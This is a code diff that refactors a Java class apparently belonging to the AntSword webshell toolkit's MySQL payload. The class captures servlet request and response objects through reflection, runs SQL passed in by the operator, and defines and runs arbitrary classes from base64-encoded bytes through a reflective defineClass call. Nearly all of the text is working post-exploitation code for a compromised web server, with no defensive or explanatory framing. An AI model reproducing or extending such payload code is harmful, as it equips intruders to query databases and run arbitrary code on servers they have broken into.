@@ -3,49 +3,20 @@ package database.mysql;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
-import java.sql.DriverManager;
-import java.sql.Connection;
-import java.sql.Statement;
-import java.sql.ResultSet;
-import java.sql.ResultSetMetaData;
+import java.sql.*;
 
 public class Query {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
-    public String encoder;
-    public String cs;
-    public String randomPrefix;
+    public String encoder = "base64";
+    public String cs = "antswordCharset";
+    public String randomPrefix = "antswordrandomPrefix";
     public String decoderClassdata;
 
     @Override
     public boolean equals(Object obj) {
-        try {
-            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception e) {
-            if (obj instanceof HttpServletRequest) {
-                request = (HttpServletRequest) obj;
-                try {
-                    Field req = request.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                    Field resp = request2.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception ex) {
-                    try {
-                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                    } catch (Exception ignored) {
-
-                    }
-                }
-            }
-        }
-        randomPrefix = "antswordrandomPrefix";
-        encoder = "base64";
-        cs = "antswordCharset";
-        StringBuffer output = new StringBuffer("");
+        this.parseObj(obj);
+        StringBuffer output = new StringBuffer();
         String tag_s = "->|";
         String tag_e = "|<-";
         String varkey1 = "antswordargencode";
@@ -92,7 +63,7 @@ public class Query {
             String ret = "";
             if (version.compareTo("1.9") >= 0) {
                 Class Base64 = Class.forName("java.util.Base64");
-                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64, new Object[]{});
+                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64);
                 ret = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str.getBytes());
             } else {
                 Class Base64 = Class.forName("sun.misc.BASE64Encoder");
@@ -154,10 +125,42 @@ public class Query {
         return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
 
+    public void parseObj(Object obj) {
+        if (obj.getClass().isArray()) {
+            Object[] data = (Object[]) obj;
+            request = (HttpServletRequest) data[0];
+            response = (HttpServletResponse) data[1];
+        } else {
+            try {
+                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+            } catch (Exception e) {
+                if (obj instanceof HttpServletRequest) {
+                    request = (HttpServletRequest) obj;
+                    try {
+                        Field req = request.getClass().getDeclaredField("request");
+                        req.setAccessible(true);
+                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                        Field resp = request2.getClass().getDeclaredField("response");
+                        resp.setAccessible(true);
+                        response = (HttpServletResponse) resp.get(request2);
+                    } catch (Exception ex) {
+                        try {
+                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                        } catch (Exception ignored) {
+
+                        }
+                    }
+                }
+            }
+        }
+    }
+
     public String asoutput(String str) {
         try {
             byte[] classBytes = Base64DecodeToByte(decoderClassdata);
-            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClassMethod.setAccessible(true);
             Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
             return cc.getConstructor(String.class).newInstance(str).toString();
